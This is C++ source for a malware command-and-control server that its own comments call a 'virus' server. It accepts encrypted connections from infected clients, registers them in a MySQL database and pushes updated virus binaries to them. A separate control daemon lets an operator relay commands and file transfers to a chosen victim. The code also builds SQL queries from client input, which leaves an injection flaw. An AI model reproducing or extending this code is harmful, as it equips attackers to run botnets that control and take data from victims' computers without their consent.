#include "main.h"
#include <cerrno>

#define VERSION 1070

stringstream ss;
string cid;
MYSQL *mConnection;
vector<Connection*> connections;
RSA_Key pkey;
RSA_Key pubkey;
RSA_Key pkey_c;
RSA_Key pubkey_c;

int main()
{
	if((mConnection = mysql()) == NULL) {
		return 1;
	}
	RSA_KeyPair keypair;
	unsigned long seed;
	ifstream urandom("/dev/urandom");
	urandom.read((char*)&seed, sizeof(seed));
	urandom.close();
	RSA_GenerateKeyPair(&keypair, 2048, seed);
	RSA_GetPrivateKey(&keypair, &pkey);
	RSA_GetPublicKey(&keypair, &pubkey);
	RSA_GenerateKeyPair(&keypair, 2048, seed);
	RSA_GetPrivateKey(&keypair, &pkey_c);
	RSA_GetPublicKey(&keypair, &pubkey_c);
	memset((char*)&keypair, 0, sizeof(keypair));
	cout << "RSA keypairs created!\n" << endl;

	// VIRUS SOCKET //
	int sock_server = socket(AF_INET, SOCK_STREAM, 0);
	if(sock_server < 0)
	{
		cout << "Error: Could not create socket!" << endl;
		return 1;
	}
	int opt = 1;
	setsockopt(sock_server, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));

	struct sockaddr_in addr_server;
	memset(&addr_server, 0, sizeof(sockaddr_in)); 
	addr_server.sin_family = AF_INET;
	addr_server.sin_addr.s_addr = INADDR_ANY;
	addr_server.sin_port = htons(22222);

	if(bind(sock_server, (struct sockaddr*)&addr_server, sizeof(sockaddr_in)) < 0)
	{
	    cout << "Error: Could not bind socket! Perhaps another instance running?" << endl;
	    return 1;
	}
	listen(sock_server, 5);
	cout << "Server started!\n" << endl;	
	// VIRUS SOCKET END //

	// SOCK SHIT //

	int sock_server2 = socket(AF_INET, SOCK_STREAM, 0);
	if(sock_server2 < 0)
	{
		    cout << "Error: Could not create socket!" << endl;
		    return 1;
		}
	int opt2 = 1;
	setsockopt(sock_server2, SOL_SOCKET, SO_REUSEADDR, (char*)&opt2, sizeof(opt2));

	struct sockaddr_in addr_server2;
	memset(&addr_server2, 0, sizeof(sockaddr_in));

	addr_server2.sin_family = AF_INET;
	addr_server2.sin_addr.s_addr = INADDR_ANY;
	addr_server2.sin_port = htons(22522);


	if(bind(sock_server2, (struct sockaddr*)&addr_server2, sizeof(sockaddr_in)) < 0)
	{
	    cout << "Error: Could not bind socket! Perhaps another instance running?" << endl;
	    return 1;
	}
	listen(sock_server2, 5);
	cout << "Control Deamon started!\n" << endl;
		
	// SOCK SHIT END // 		

	pthread_t client_control;
	pthread_create(&client_control, NULL, client_thread, &sock_server2);
	
	int sock;
	struct sockaddr_in addr;
	socklen_t addr_len = sizeof(sockaddr_in);
	Connection* c;
	while((sock = accept(sock_server, (struct sockaddr*)&addr, &addr_len)) >= 0)
	{
		c = new Connection();
		c->sockfd = sock;
		c->addr = addr;
		pthread_t thread;
		pthread_create(&thread, NULL, thread_function, c);
	}
}

void *thread_function( void *ptr )
{
	Connection* c = (Connection*)ptr;

	//Key-Exchange
	char rsa_tmp[256];
	char aes_key[32];
	RSA_PublicKeyToA(&pubkey, (char*)rsa_tmp);
	send(c->sockfd, rsa_tmp, 256 + sizeof(pubkey.L), 0);
    int i = 0, rc;
    while(i < 256)
	{
		i += (rc = recv(c->sockfd, rsa_tmp + i, 256 - i, 0));
		if(rc == -1)
		{
			free(c);
			return 0;
		}
	}
	RSA_Encrypt(&pkey, (char*)rsa_tmp, (char*)rsa_tmp);
	YansPadding_Decrypt((unsigned char*)rsa_tmp, 224, (unsigned char*)aes_key, 32);
	secure_init(&c->sock, c->sockfd, (unsigned char*)aes_key);
	memset(rsa_tmp, 0, 256);
	memset(aes_key, 0, 32);

    string sendback;
    int res;
	string error = "";
	bool login = false;

	string buf;
	int rdc;
	while((rdc = secure_read(&c->sock)) != -1) {
		if(rdc == 0)
			break;
		else
			buf = string(c->sock.buf, rdc);
		if(buf[0] == '#') {
			short size = buf.size();
			c->buf = (char*)buf.c_str();
			write(c->pipefd[1], &size, sizeof(size));
			read(c->pipefd_sync[0], &size, sizeof(size));
		} else if(buf.size() > 32) {
			// TIME STAMP SECTION //
			
			time_t rawtime;
			struct tm * timeinfo;
			char buffer [80];

			time (&rawtime);
			timeinfo = localtime (&rawtime);

			strftime (buffer,80,"[%Y/%m/%d, %H:%M:%S]:\n",timeinfo);
			cout << buffer << endl;
			
			// TIME STAMP SECTION END //		

			//string data = buf;
			//string buf_new = buf;
			//buf.erase(std::remove(buf.begin(), buf.end(), '\n'), buf.end());
			//buf_new = buf_new.substr(0,buf_new.length()-1);
			//cout << "\t\"" << buf_new << "\"" << endl;
			cout << "\t\"" << buf << "\"" << endl;
			ss.str("");
			ss.clear();	
			ss
			<< (c->addr.sin_addr.s_addr & 0x000000FF) << "."
			<< ((c->addr.sin_addr.s_addr & 0x0000FF00) >> 8) << "."
			<< ((c->addr.sin_addr.s_addr & 0x00FF0000) >> 16) << "."
			<< ((c->addr.sin_addr.s_addr & 0xFF000000) >> 24);

			//Unique client ID is 32bit hex string. Client is sending ID in front of the request.
			cout << "\tChecking request..." << endl;
			if(buf[32] == ':') {
				cid = buf.substr(0,32);
				if(cid == "00000000000000000000000000000000") {
					cout << "\tCreating unique ID..." << endl;
					string str;
					string array = "abcdef0123456789";
					for(int i = 0; i < 32; i++) {
						int num = rand() % 16;
						str += array[num];
					}
					int result = mysql_query(mConnection, 
					("INSERT INTO clients (ip, date, joined, cid) VALUES ('"+ss.str()+"', '"+itoa(time(NULL))+"', '"+itoa(time(NULL))+"', '"+ str +"')").c_str());
					
					if(result == 0) {
						sendback = string() + "#210-OK: id:" + str;
						secure_send(&c->sock, sendback.c_str(), sendback.size());
						cout << "\tNew Client '"+ str +"' added.\n" << endl;
					} else {
						sendback = string() + "#510-ER: Query failed. " + mysql_error(mConnection);
						secure_send(&c->sock, sendback.c_str(), sendback.size());
					}
					login = true;
				} else {
					
					cout << "\tMaking query..." << endl;
					
					int result = mysql_query(mConnection, ("SELECT * FROM clients WHERE cid = '" + cid + "'").c_str());
					MYSQL_RES* res = mysql_store_result(mConnection);
					cout << "\t" << string(&buf[32]) << endl;
					if(login == false) { //&& string(&buf[32]) == ":login") {
						
						if(mysql_num_rows(res) == 0) {
						//MYSQL_ROW row = mysql_fetch_row(res);
							//sendback = string() + "#540-ER: You seem not to have an ID.";
							sendback = string() + "#310-ER: You seem not to have an ID.";
							secure_send(&c->sock, sendback.c_str(), sendback.size());
							cout << "\t" << cid  << ": ID not found." << endl;;
							error += "Client has no ID.\n";
						} else {
							cout << "\t#220-OK: " << cid  << " has an ID.\n"  << endl;
							sendback = string() + "#220-OK: You have an valid ID! Login succeeded.";
							secure_send(&c->sock, sendback.c_str(), sendback.size());
							c->client_id = cid;	

							update_client();
							
							login = true;
							connections.push_back(c);
							mysql_query(mConnection, "use echo");
							mysql_query(mConnection, (string() + "UPDATE servers SET online=" + itoa(connections.size())).c_str());
							mysql_query(mConnection, "use main");
						}

					} else {
			
						if(string(&buf[33]) == "") {
							sendback = string() + "#300-ER: Empty String given.";
							secure_send(&c->sock, sendback.c_str(), sendback.size());
						} else if(string(&buf[33]).substr(0,6) == "update") {
							int client_version = VERSION;
							int remote_version = atoi(string(&buf[33]).substr(7).c_str());
							
							if(remote_version < client_version) {
								string sendback = string() + "#260-OK: New version available";
								secure_send(&c->sock, sendback.c_str(), sendback.size());

								cout << "\tUpdate" << endl;
							
								string infile = "/home/data/projects/virus";
								ifstream f_update(infile.c_str());
								
								f_update.seekg(0, ios_base::end);
								long size = f_update.tellg();
								f_update.seekg(0, ios_base::beg);
								
								string update_size = itoa(size);
								sendback = "#280-OK: "+ update_size;
								secure_send(&c->sock, sendback.c_str(), sendback.size());

								short readcount;
								char buf[4096];
								while(f_update.good())
								{
									f_update.read(buf, 4096);
									if(size > 4096)
										secure_send(&c->sock, buf, 4096);
									else
										secure_send(&c->sock, buf, size);
									size -= 4096;
								}	
					
							} else {
								string version = itoa(remote_version);
								string sendback = string() + "#270-OK: Latest version: " + version;	
								secure_send(&c->sock, sendback.c_str(), sendback.size());
								cout << "\tNo Update required" << endl;
							}
						} else if(string(&buf[33]) == "ping") {
							sendback = string()+ "#200-OK: pong";
							if(update_client()) {
								cout << "\tQuery failed!" << endl;
								// SEND MAIL/MESSAGE HERE //
							}
							secure_send(&c->sock, sendback.c_str(), sendback.size());
						} else if(string(&buf[33]) == "test") {
							sendback = string()+ "#230-OK: TEST";
							secure_send(&c->sock, sendback.c_str(), sendback.size());
						} else if(string(&buf[33]).substr(0, 4) == "bin:") {
							long size = atoi(string(&buf[33]).substr(4).c_str());
							bool infinite = (size == -1);
							short readcount;
							while((size > 0) || infinite)
							{
								if((readcount = secure_read(&c->sock)) <= 0)
									break;
								c->buf = c->sock.buf;
								write(c->pipefd[1], &readcount, 2);
								read(c->pipefd_sync[0], &readcount, 2);
								if(!infinite)
									size -= readcount;
								c->buf = 0;
							}
							readcount = 0;
							write(c->pipefd[1], &readcount, 2);
						} else {
							sendback = string()+ "#510-ER: Command not found.";
							secure_send(&c->sock, sendback.c_str(), sendback.size());
							cout << "\t#510-ER: Command not found" << endl; 
						}
						if(error == "") {
							cout << "\tEverything OK!\n" << endl;
						} else  {
							cout << string() + error << endl;
						}

					}
				}	
				
			} else {
				sendback = string() + "#500-ER: Wrong request sent:" + buf;
				secure_send(&c->sock, sendback.c_str(), sendback.size());
				cout << "#500-ER: " << cid << " sent wrong request" << endl;
			}

		}
	}
	c->sockfd = 0;
	sendback = "#340-ER: " + cid + " lost connection\n\n";
	cout << sendback << endl;
	if(c->pipefd[0])
	{
		write(c->pipefd[1], sendback.c_str(), sendback.size() + 1);
		close(c->pipefd[1]);
		close(c->pipefd_sync[1]);
	}
    secure_close(&c->sock);

	for(int i = 0; i < connections.size(); i++)
		if(connections[i] == c)
		{
			connections.erase(connections.begin() + i);
			mysql_query(mConnection, "use echo");
			mysql_query(mConnection, (string() + "UPDATE servers SET online=" + itoa(connections.size())).c_str());
			mysql_query(mConnection, "use main");
			break;
		}
	if(c->pipefd[0])
		c->pipefd[1] = c->pipefd[0] = 0;
	else
		free(c);
	
}

void* client_thread ( void *ptr ) {

	int sock; 
	struct sockaddr_in addr;
	socklen_t addr_len = sizeof(addr);
	int sock_server = *(int*)ptr;

	while((sock = accept(sock_server, (struct sockaddr*)&addr, &addr_len)) >= 0)
	{
		pthread_t thread;
		pthread_create(&thread, NULL, client_thread_function, &sock);
		
		
		cout << "EchoClient connected!" << endl;
		
		
		char buf[4096];
		string sendback;
		int res;
		memset(buf, 0, 4096);	
	}
	cout << "EchoClient lost connection" << endl;
		
}

void* client_thread_function ( void *ptr ) {
	int sockfd = *(int*)ptr;
	struct secure_socket sock;

	//Key-Exchange
	char rsa_tmp[256];
	char aes_key[32];
	RSA_PublicKeyToA(&pubkey_c, (char*)rsa_tmp);
	send(sockfd, rsa_tmp, 256 + sizeof(pubkey.L), 0);
    int i = 0;
    while(i < 256)
        i += recv(sockfd, rsa_tmp + i, 256, 0);
	RSA_Encrypt(&pkey_c, (char*)rsa_tmp, (char*)rsa_tmp);
	YansPadding_Decrypt((unsigned char*)rsa_tmp, 224, (unsigned char*)aes_key, 32);
	secure_init(&sock, sockfd, (unsigned char*)aes_key);
	memset(rsa_tmp, 0, 256);
	memset(aes_key, 0, 32);

	string data;
	int rdc = 0;
	while((rdc = secure_read(&sock)) != -1) {
		data = string(sock.buf, rdc);

		int result = mysql_query(mConnection,
			("SELECT * FROM main.clients WHERE cid = '"+data+"'").c_str());
		MYSQL_RES* res = mysql_store_result(mConnection);
		if(mysql_num_rows(res) != 0) {
			int i;
			for(i = connections.size()-1; i >= 0; i--) {
				Connection* virus = connections[i];	
				if(virus->client_id == data) {
					pipe(virus->pipefd);
					pipe(virus->pipefd_sync);
					
					string sendback = "#240-OK: Client exists";
					secure_send(&sock, sendback.c_str(), sendback.size());

					//sendback = "#250-OK: Init control mode\n";
					//send(virus->sock, sendback.c_str(), sendback.size(), 0); 

					string client_data;
					int res = 1;
					while(((rdc = secure_read(&sock)) != -1) && virus->sockfd) {
						client_data = string(sock.buf, rdc);
						client_data = "#500-CO: " + client_data;
						secure_send(&virus->sock, client_data.c_str(), client_data.size());
						if(client_data.substr(9,7) == "upload ")
						{
							long size = atoi(client_data.substr(client_data.find(':',9)+1).c_str());
							short readcount;
							char buf[4096];
							while(size > 0)
							{
								//TODO
								break;
							}
						}

						string virus_data;
						short size;
						if(res = read(virus->pipefd[0], &size, sizeof(size)) == -1)
							break;
						virus_data = string(virus->buf, size);
						write(virus->pipefd_sync[1], &size, sizeof(size));
						secure_send(&sock, virus_data.c_str(), virus_data.size());
						if(virus_data.substr(0, 4) == "#500")
						{
							short readcount;
							while(true)
							{
								read(virus->pipefd[0], &readcount, 2);
								if(readcount <= 0)
									break;
								secure_send(&sock, virus->buf, readcount);
								write(virus->pipefd_sync[1], &readcount, 2);
							}
							secure_send(&sock, 0, 0);
						}
						else if(virus_data.substr(0, 4) == "#600")
						{
							long size = atoi(virus_data.substr(virus_data.find(':', 9) + 1).c_str());
							short readcount;
							while(size > 0)
							{
								read(virus->pipefd[0], &readcount, 2);
								if(readcount <= 0)
									break;
								secure_send(&sock, virus->buf, readcount);
								write(virus->pipefd_sync[1], &readcount, 2);
								size -= readcount;
							}							
							read(virus->pipefd[0], &readcount, 2);
						}
					}
					if(res != 1 || !virus->sockfd)
					{	
						client_data = "#340-ER: Virus lost connection\n";
						secure_send(&sock, client_data.c_str(), client_data.size());
					}
					close(virus->pipefd[0]);
					close(virus->pipefd_sync[0]);
					virus->pipefd[0] = 0;
					virus->pipefd_sync[0] = 0;
					if(!virus->sockfd)
						free(virus);
					break;
				}
			}
			
			//if(i == -1) {
				string client_data = "#520-ER: Virus not active";
				secure_send(&sock, client_data.c_str(), client_data.size());
			//}
		}
		//} else {
			string sendback = "#580-ER: This Client was not found in the database.";	
			//string sendback = "#520-ER: Virus not active. (cid nf)";
			secure_send(&sock, sendback.c_str(), sendback.size());
		
		//if(secure_send(&sock, data.c_str(), data.size()) == -1) break;
	}
	//cout << "After client not found in the database" << endl;
}

int update_client() 
{
	 
	int result = mysql_query(mConnection, 
		("UPDATE clients SET ip = '"+ss.str()+"', date = '"+itoa(time(NULL))+"' WHERE cid = '"+cid+"'").c_str());
	if(result == 0) {
		return 0;
	} else { 
		return -1;
	}
				
}

string itoa(long i)
{
    stringstream ss;
    ss << i;
    return ss.str();
}
